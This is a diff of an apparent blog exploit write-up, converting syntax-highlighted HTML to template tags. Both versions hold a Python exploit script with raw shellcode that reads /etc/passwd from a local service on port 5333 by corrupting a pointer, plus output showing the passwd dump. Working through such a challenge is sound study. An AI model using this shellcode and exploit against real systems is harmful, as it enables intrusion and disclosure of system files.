-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_pivot = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>let&rsquo;s crash the binary to see if this works</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&ldquo;c 1\n&rdquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_tmp = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_vuln = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send read request to crash binary</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/p&gt;</span>
+<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>terminate connection cleanly</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+s.send(&lsquo;x\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>
+<p>s.close()
+{% endhighlight %}</p>
 
 <p>In the other terminal, I observed:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 53500
-Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5333</span> <span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>
+<p>{% highlight bash %}
+connect to [127.0.0.1] from localhost [127.0.0.1] 53500
+Trace/breakpoint trap (core dumped)
+listening on [any] 5333 &hellip;
+{% endhighlight %}</p>
 
 <p>BOOM! Code execution on my local machine!</p>
 
@@ -266,161 +286,167 @@ listening on <span class="o">[</span>any<span class="o">]</span> <span class="m"
 
 <p>I stuck it in the exploit and lo and behold:</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>{% highlight python %}</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>!/usr/bin/python</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>from socket import *
+import time, re, struct</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&amp;lsquo;, data.strip())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>def getID(data):
+    match = re.search(r&#8217;(\d.*)$&lsquo;, data.strip())
+    if match:
+        return int(match.group(1))</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s = socket(AF_INET, SOCK_STREAM)
+s.connect((&lsquo;localhost&rsquo;, 5333))</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>banner</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print s.recv(1024)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send first string. this will be our shellcode</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x5f</span>\<span class="n">x80</span>\<span class="n">x77</span>\<span class="n">x0b</span>\<span class="n">x41</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x02</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x66</span>\<span class="n">x81</span>\<span class="n">xec</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x8d</span>\<span class="n">x34</span>\<span class="n">x24</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc7</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x66</span>\<span class="n">xba</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xff</span>\<span class="n">x40</span>\<span class="n">x80</span>\<span class="n">xc7</span>\<span class="n">x01</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x01</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x3c</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">xe8</span>\<span class="n">xbc</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">x2f</span>\<span class="n">x65</span>\<span class="n">x74</span>\<span class="n">x63</span>\<span class="n">x2f</span>\<span class="n">x70</span>\<span class="n">x61</span>\<span class="n">x73</span>\<span class="n">x73</span>\<span class="n">x77</span>\<span class="n">x64</span>\<span class="n">x41</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_shellcode = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)
+data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_pivot = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>let&rsquo;s crash the binary to see if this works</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&ldquo;c 1\n&rdquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_tmp = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>   <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+s.recv(2)   # receive pesky &lsquo;> &rsquo;
+p_vuln = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send read request to crash binary</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print s.recv(1000)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>terminate connection cleanly</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+s.send(&lsquo;x\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>
+<p>s.close()
+{% endhighlight %}</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span> <span class="nv">shellcode</span> <span class="o">=</span> 0x01355030
-<span class="o">[</span>+<span class="o">]</span> <span class="nv">pivot</span> <span class="o">=</span> 0x01355030
-<span class="o">[</span>+<span class="o">]</span> vulnerable <span class="nv">pointer</span> <span class="o">=</span> 0x013552b0
+<p>{% highlight bash %}
+[+] shellcode = 0x01355030
+[+] pivot = 0x01355030
+[+] vulnerable pointer = 0x013552b0
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
